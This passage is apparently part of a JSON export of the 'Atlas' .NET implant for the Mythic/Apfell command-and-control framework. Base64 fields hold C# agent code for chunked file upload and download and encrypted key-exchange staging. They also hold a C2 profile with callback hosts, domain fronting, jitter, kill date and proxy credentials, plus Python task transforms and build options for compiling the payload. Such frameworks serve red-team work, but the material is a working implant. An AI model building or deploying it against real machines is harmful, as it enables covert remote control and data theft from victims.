KICAgICAgICAgICAgcHVibGljIHN0cmluZyB0YXNrX2lkIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBKc29uRm9ybWF0ID0gQCJ7eyIiYWN0aW9uIiI6IiJ7MH0iIiwiImNodW5rX3NpemUiIjp7MX0sIiJmaWxlX2lkIiI6IiJ7Mn0iIiwiImNodW5rX251bSIiOnszfSwgIiJmdWxsX3BhdGgiIjogIiJ7NH0iIiwiInRhc2tfaWQiIjoiIns1fSIifX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBUb0pzb24oVXBsb2FkIHVwbG9hZCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gU3RyaW5nLkZvcm1hdCgNCiAgICAgICAgICAgICAgICAgICAgdXBsb2FkLkpzb25Gb3JtYXQsDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodXBsb2FkLmFjdGlvbiksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodXBsb2FkLmNodW5rX3NpemUuVG9TdHJpbmcoKSksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodXBsb2FkLmZpbGVfaWQpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHVwbG9hZC5jaHVua19udW0uVG9TdHJpbmcoKSksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodXBsb2FkLmZ1bGxfcGF0aCksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodXBsb2FkLnRhc2tfaWQpDQogICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgcHVibGljIGNsYXNzIFVwbG9hZFJlc3BvbnNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgdG90YWxfY2h1bmtzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgY2h1bmtfbnVtIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgY2h1bmtfZGF0YSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGZpbGVfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB0YXNrX2lkIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgVXBsb2FkUmVzcG9uc2VGb3JtYXQgPSBAInt7IiJhY3Rpb24iIjogIiJ7MH0iIiwgIiJ0b3RhbF9jaHVua3MiIjogezF9LCAiImNodW5rX251bSIiOiB7Mn0sICIiY2h1bmtfZGF0YSIiOiAiInszfSIiLCAiImZpbGVfaWQiIjogIiJ7NH0iIiwgIiJ0YXNrX2lkIiI6ICIiezV9IiJ9fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxceyIsIEAieyIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7Mn0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezJ9IiwgIig\/J2dyb3VwMicuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInszfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7M30iLCAiKD8nZ3JvdXAzJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezR9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoIns0fSIsICIoPydncm91cDQnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7NX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezV9IiwgIig\\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsyfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7Mn0iLCAiKD8nZ3JvdXAyJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhLlJlcGxhY2UoQCJcIiwgQCIiKSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDIiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoZXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgRG93bmxvYWRSZXNwb25zZSBGcm9tSnNvbihzdHJpbmcgbWVzc2FnZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gRG93bmxvYWRSZXNwb25zZS5QYXJzZShtZXNzYWdlLCBEb3dubG9hZFJlc3BvbnNlRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gNSkgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBuZXcgRG93bmxvYWRSZXNwb25zZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gcGFyc2VMaXN0WzFdLA0KICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gcGFyc2VMaXN0WzJdDQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBHZXRTdGFnZQ0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGFjdGlvbiB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHB1Yl9rZXkgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBzZXNzaW9uX2lkIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBKc29uRm9ybWF0ID0gQCJ7eyIiYWN0aW9uIiI6IiJ7MH0iIiwiInB1Yl9rZXkiIjoiInsxfSIiLCIic2Vzc2lvbl9pZCIiOiIiezJ9IiJ9fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFRvSnNvbihHZXRTdGFnZSBnZXRfc3RhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIFN0cmluZy5Gb3JtYXQoDQogICAgICAgICAgICAgICAgICAgIGdldF9zdGFnZS5Kc29uRm9ybWF0LA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGdldF9zdGFnZS5hY3Rpb24pLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGdldF9zdGFnZS5wdWJfa2V5KSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShnZXRfc3RhZ2Uuc2Vzc2lvbl9pZCkNCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIFN0YWdlUmVzcG9uc2UNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhY3Rpb24geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB1dWlkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgc2Vzc2lvbl9rZXkgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBzZXNzaW9uX2lkIHsgZ2V0OyBzZXQ7IH0NCg0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBKc29uRm9ybWF0ID0gQCJ7eyIidXVpZCIiOiAiInswfSIiLCAiInNlc3Npb25fa2V5IiI6ICIiezF9IiIsICIiYWN0aW9uIiI6ICIiezJ9IiIsICIic2Vzc2lvbl9pZCIiOiAiInszfSIifX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZShzdHJpbmcgZGF0YSwgc3RyaW5nIGZvcm1hdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JtYXQgPSBSZWdleC5Fc2NhcGUoZm9ybWF0KS5SZXBsYWNlKCJcXHsiLCBAInsiKTsNCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezB9IiwgIig\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezJ9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsyfSIsICIoPydncm91cDInLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7M30iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezN9IiwgIig\/J2dyb3VwMycuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YS5SZXBsYWNlKEAiXCIsIEAiIikpOw0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBtYXRjaGVzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDAiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDEiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMiJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMyJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDMiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hlczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBTdGFnZVJlc3BvbnNlIEZyb21Kc29uKHN0cmluZyBtZXNzYWdlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBwYXJzZUxpc3QgPSBTdGFnZVJlc3BvbnNlLlBhcnNlKG1lc3NhZ2UsIEpzb25Gb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSA0KSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBTdGFnZVJlc3BvbnNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSBwYXJzZUxpc3RbMl0sDQogICAgICAgICAgICAgICAgICAgIHV1aWQgPSBwYXJzZUxpc3RbMF0sDQogICAgICAgICAgICAgICAgICAgIHNlc3Npb25fa2V5ID0gcGFyc2VMaXN0WzFdLA0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uX2lkID0gcGFyc2VMaXN0WzNdDQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCn0NCg=="
        },
        {
          "Http_4.0.cs": ""
        },
        {
          "Uuid.txt": "VVVJRF9IRVJF"
        },
        {
          "Modules.cs": ""
        }
      ],
      "support_scripts": [
        {
          "name": "create_table",
          "script": "ZnVuY3Rpb24oaGVhZGVycywgZGF0YSl7CiAgdmFyIG91dHB1dCA9ICI8dGFibGUgc3R5bGU9J292ZXJmbG93OnNjcm9sbDt3aGl0ZS1zcGFjZTpub3dyYXA7d2lkdGg6MTAwJTtjb2xvcjp3aGl0ZScgY2xhc3M9J3RhYmxlLXN0cmlwZWQgdGFibGUtaG92ZXIgYm9yZGVyIGJvcmRlci1kYXJrIHNoYWRvdyB0YWJsZS1jb25kZW5zZWQgdGFibGUtZGFyayc+IjsKICBvdXRwdXQgKz0gIjx0cj4iOwogIGZvcih2YXIgaSA9IDA7IGkgPCBoZWFkZXJzLmxlbmd0aDsgaSsrKXsKICAgIG91dHB1dCArPSAiPHRoIHN0eWxlPSdiYWNrZ3JvdW5kLWNvbG9yOiMzOTM0ODU7Y29sb3I6d2hpdGU7aGVpZ2h0OjQwcHg7dGV4dC1hbGlnbjpsZWZ0O3BhZGRpbmc6MHB4IDBweCAwcHggMjBweDt3aWR0aDoiICsgaGVhZGVyc1tpXVsnc2l6ZSddICsgIicgb25jbGljaz1cInNvcnRfdGFibGUodGhpcylcIj4iICsgaGVhZGVyc1tpXVsnbmFtZSddLnRvVXBwZXJDYXNlKCkgKyAiPC90aD4iOwogIH0KICBvdXRwdXQgKz0gIjwvdHI+IjsKICBmb3IodmFyIGkgPSAwOyBpIDwgZGF0YS5sZW5ndGg7IGkrKyl7CiAgICBvdXRwdXQgKz0gIjx0ciBzdHlsZT0ndGV4dC1hbGlnbjpsZWZ0OyIgKyBkYXRhW2ldWydyb3ctc3R5bGUnXSArICInPiI7CiAgICBmb3IodmFyIGogPSAwOyBqIDwgaGVhZGVycy5sZW5ndGg7IGorKyl7CiAgICAgaWYoZGF0YVtpXVsnY2VsbC1zdHlsZSddLmhhc093blByb3BlcnR5KGhlYWRlcnNbal0pKXsKICAgICAgICBvdXRwdXQgKz0gIjx0ZCBzdHlsZT0ncGFkZGluZzowcHggMHB4IDBweCAyMHB4OyIgKyBkYXRhW2ldWydjZWxsLXN0eWxlJ11baGVhZGVyc1tqXVsnbmFtZSddXSArICInPiIgKyBkYXRhW2ldW2hlYWRlcnNbal1bJ25hbWUnXV0gKyAiPC90ZD4iOwogICAgIH0KICAgICBlbHNlewogICAgICAgIG91dHB1dCArPSAiPHRkIHN0eWxlPSdwYWRkaW5nOjBweCAwcHggMHB4IDIwcHgnPiIgKyBkYXRhW2ldW2hlYWRlcnNbal1bJ25hbWUnXV0gKyAiPC90ZD4iOwogICAgIH0KICAgIH0KICAgIG91dHB1dCArPSAiPC90cj4iOwogIH0KICBvdXRwdXQgKz0gIjwvdGFibGU+IjsKICByZXR1cm4gb3V0cHV0Owp9"
        },
        {
          "name": "collapsable",
          "script": "ZnVuY3Rpb24oaGVhZGVyLCBlbGVtZW50LCB1bmlxdWVfaWQpewoJLy90YWtlcyBpbiBpbmZvcm1hdGlvbiBhYm91dCB0aGUgaGVhZGVyIHRvIG1ha2UgYW5kIHRoZSBlbGVtZW50IHRvIGNvbGxhcHNlIHdpdGhpbiBpdCAoYXMgYSBzdHJpbmcpCgl2YXIgb3V0cHV0ID0gIjxkaXYgY2xhc3M9J2NhcmQnPjxkaXYgY2xhc3M9J2NhcmQtaGVhZGVyIGJvcmRlciBib3JkZXItZGFyayBzaGFkb3cnPjxhIGNsYXNzPSdidG4nIHR5cGU9J2J1dHRvbicgZGF0YS10b2dnbGU9J2NvbGxhcHNlJyBkYXRhLXRhcmdldD0nI2JzdGFzayIgKyB1bmlxdWVfaWQgKyAiJyBhcmlhLWV4cGFuZGVkPSdmYWxzZScgYXJpYS1jb250cm9scz0nYnN0YXNrIiArIHVuaXF1ZV9pZCArICInPiIrIGhlYWRlclsnbmFtZSddICsgIjwvYT48L2Rpdj4iOwogICAgICBvdXRwdXQgKz0gIjxkaXYgY2xhc3M9J2NvbGxhcHNlJyBpZD1cImJzdGFzayIgKyB1bmlxdWVfaWQgKyAiXCIgc3R5bGU9J3dpZHRoOjEwMCUnPiI7CiAgICAgIG91dHB1dCArPSAiPGRpdiBjbGFzcz0nYmctY2FyZC1ib2R5LWwyIGNhcmQtYm9keSBib3JkZXIgYm9yZGVyLWRhcmsgc2hhZG93Jz4iICsgZWxlbWVudCArICI8L2Rpdj48L2Rpdj48L2Rpdj4iOwogIHJldHVybiBvdXRwdXQ7Cn0="
        }
      ],
      "c2_profiles": {
        "default": [
          {
            "Config_temp.cs": "dXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7Cm5hbWVzcGFjZSBBdGxhcwp7CiAgICBwdWJsaWMgY2xhc3MgQ29uZmlnCiAgICB7CiAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gQ2FsbGJhY2tIb3N0cyA9IG5ldyBMaXN0PHN0cmluZz4geyAiY2FsbGJhY2tfaG9zdDpjYWxsYmFja19wb3J0IiB9OwogICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxVdGlscy5TZXJ2ZXI+IFNlcnZlcnMgPSBuZXcgTGlzdDxVdGlscy5TZXJ2ZXI+IHsgfTsKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQYXlsb2FkVVVJRCA9ICIlVVVJRCUiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFVVSUQgPSAiIjsKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBVc2VyQWdlbnQgPSAiVVNFUl9BR0VOVCI7CiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgSG9zdEhlYWRlciA9ICJkb21haW5fZnJvbnQiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgaW50IFNsZWVwID0gY2FsbGJhY2tfaW50ZXJ2YWw7CiAgICAgICAgcHVibGljIHN0YXRpYyBpbnQgSml0dGVyID0gY2FsbGJhY2tfaml0dGVyOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEtpbGxEYXRlID0gImtpbGxkYXRlIjsKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQYXJhbSA9ICIlUEFSQU0lIjsKICAgICAgICBwdWJsaWMgY29uc3QgaW50IENodW5rU2l6ZSA9ICVDSFVOS19TSVpFJTsKICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgRGVmYXVsdFByb3h5ID0gJURFRkFVTFRfUFJPWFklOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFByb3h5QWRkcmVzcyA9ICIlUFJPWFlfQUREUkVTUyUiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFByb3h5VXNlciA9ICIlUFJPWFlfVVNFUiUiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFByb3h5UGFzc3dvcmQgPSAiJVBST1hZX1BBU1NXT1JEJSI7CiNpZiAoREVGQVVMVCB8fCBERUZVTEFUX1BTSyB8fCBERUZBVUxUX0VLRSkKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBVcmwgPSAiL2FwaS92MS40L2FnZW50X21lc3NhZ2UiOwojZW5kaWYKI2lmIChEZWZhdWx0X1BTSyB8fCBERUZBVUxUX0VLRSkKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQc2sgPSAiQUVTUFNLIjsKI2VuZGlmCiNpZiBERUZBVUxUX0VLRQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFNlc3Npb25JZCA9ICIiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIHRlbXBVVUlEID0gIiI7CiAgICAgICAgcHVibGljIHN0YXRpYyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJTQUNyeXB0b1NlcnZpY2VQcm92aWRlciBSc2E7CiNlbmRpZgogICAgICAgIHB1YmxpYyBzdGF0aWMgRGljdGlvbmFyeTxzdHJpbmcsIHN0cmluZz4gTW9kdWxlcyA9IG5ldyBEaWN0aW9uYXJ5PHN0cmluZywgc3RyaW5nPigpOwogICAgfQp9"
          }
        ]
      },
      "load_transforms": [],
      "create_transforms": [
        {
          "parameter": "false\ntrue",
          "description": "True will validate SSL certifiactes, False will allow self-signed certificates for HTTPS traffic",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 4
        },
        {
          "parameter": "x64\nx86\nanycpu",
          "description": "Architecture to target when compiling",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 2
        },
        {
          "parameter": "DEFAULT_EKE\nDEFAULT_PSK\nDEFAULT",
          "description": "Profile\/encryption to use",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 3
        },
        {
          "parameter": "id",
          "description": "Specify the query parameter to use for GET requests",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 5
        },
        {
          "parameter": "512000",
          "description": "Specify the chunking size to use for download\/upload and command output",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 6
        },
        {
          "parameter": "true\nfalse",
          "description": "True will use the system's default proxy settings, false will use proxy settings specify below",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 7
        },
        {
          "parameter": "4.0\n3.5",
          "description": "Version of .NET to compile against. (Win10 = 4.0, Win7 = 3.5)",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 1
        },
        {
          "parameter": "",
          "description": "(Optional) Specify the proxy address to use for web requests ",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 8
        },
        {
          "parameter": "",
          "description": "(Optional) Specify the password to use to authenticate to the proxy server",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 9
        },
        {
          "parameter": "",
          "description": "(Optional) Specify the username to use to authenticate to the proxy server",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 10
        },
        {
          "parameter": "",
          "description": "Compile Atlas payload",
          "transform": "atlas_compile_and_return",
          "parameter_type": "None",
          "order": 12
        },
        {
          "parameter": "",
          "description": "",
          "transform": "atlas_stamp_parameters",
          "parameter_type": "None",
          "order": 11
        }
      ],
      "transforms": [
        {
          "code": "YXN5bmMgZGVmIHN3YXBfc2hvcnRuYW1lcyhzZWxmLCB0YXNrX3BhcmFtczogc3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoNCiAgICAjIHNldHMgYSBmbGFnIHRvIHN3YXAgcGFyYW1ldGVycyB0aGF0IGVuZCBpbiBfaWQgd2l0aCBmaWxlbmFtZXMgaWYgdGhlIGN1cnJlbnQgdmFsdWUgZXhpc3RzIGFzIGEgZmlsZSBuYW1lDQogICAgaW1wb3J0IGpzb24NCiAgICB0cnk6DQogICAgICAgIHBhcmFtcyA9IGpzb24ubG9hZHModGFza19wYXJhbXMpDQogICAgICAgIHBhcmFtc1snc3dhcF9zaG9ydG5hbWVzJ10gPSBUcnVlDQogICAgICAgIHJldHVybiBqc29uLmR1bXBzKHBhcmFtcykNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHByaW50KCJjYW4ndCBhZGQgc3dhcF9zaG9ydG5hbWVzIGZpZWxkIHNpbmNlIGl0J3Mgbm90IGpzb24iKQ0KICAgIHJldHVybiB0YXNrX3BhcmFtcw==",
          "name": "swap_shortnames",
          "parameter_type": "None",
          "description": "Swap *_id parameter filename to corresponding file_id",
          "is_command_code": true,
          "timestamp": "04\/12\/2020 20:04:01",
          "id": 8,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGF0bGFzX3VwbG9hZF9zaG9ydGhhbmQoc2VsZiwgdGFza19wYXJhbXM6c3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoNCiAgICBpbXBvcnQganNvbg0KICAgIGlmIGxlbih0YXNrX3BhcmFtcykgPT0gMDoNCiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJNaXNzaW5nIHBhcmFtZXRlcnMiKQ0KICAgIGlmIHRhc2tfcGFyYW1zWzBdID09ICJ7IjoNCiAgICAgICAgcmV0dXJuIHRhc2tfcGFyYW1zDQogICAgcGllY2VzID0gdGFza19wYXJhbXMuc3BsaXQoIiAiKQ0KICAgIHRhc2tfZGljdCA9IHsiYXNzZW1ibHlfaWQiOiBwaWVjZXNbMF0sICJyZW1vdGVfcGF0aCI6ICcgJy5qb2luKHBpZWNlc1sxOl0pfQ0KICAgIHJldHVybiBqc29uLmR1bXBzKHRhc2tfZGljdCk=",
          "name": "atlas_upload_shorthand",
          "parameter_type": "None",
          "description": "Swap out filename for needed file_id",
          "is_command_code": true,
          "timestamp": "04\/12\/2020 20:04:01",
          "id": 7,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGF0bGFzX2xvYWRhc3NlbWJseV9zaG9ydGhhbmQoc2VsZiwgdGFza19wYXJhbXM6c3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoNCiAgICBpbXBvcnQganNvbg0KICAgIGlmIGxlbih0YXNrX3BhcmFtcykgPT0gMDoNCiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJNaXNzaW5nIHBhcmFtZXRlcnMiKQ0KICAgIGlmIHRhc2tfcGFyYW1zWzBdID09ICJ7IjoNCiAgICAgICAgdGFza19kaWN0ID0ganNvbi5sb2Fkcyh0YXNrX3BhcmFtcykNCiAgICAgICAgdGFza19kaWN0WydyZW1vdGVfcGF0aCddID0gJycNCiAgICAgICAgcmV0dXJuIGpzb24uZHVtcHModGFza19kaWN0LCBzb3J0X2tleXM9VHJ1ZSkNCiAgICB0YXNrX2RpY3QgPSB7ImFzc2VtYmx5X2lkIjogdGFza19wYXJhbXMsICJyZW1vdGVfcGF0aCI6ICIifQ0KICAgIHJldHVybiBqc29uLmR1bXBzKHRhc2tfZGljdCk=",
          "name": "atlas_loadassembly_shorthand",
          "parameter_type": "None",
          "description": "Swap out filenames for needed file_id",
          "is_command_code": true,
          "timestamp": "04\/12\/2020 20:04:01",
          "id": 9,
          "operator": "apfell_admin"
        },
        {
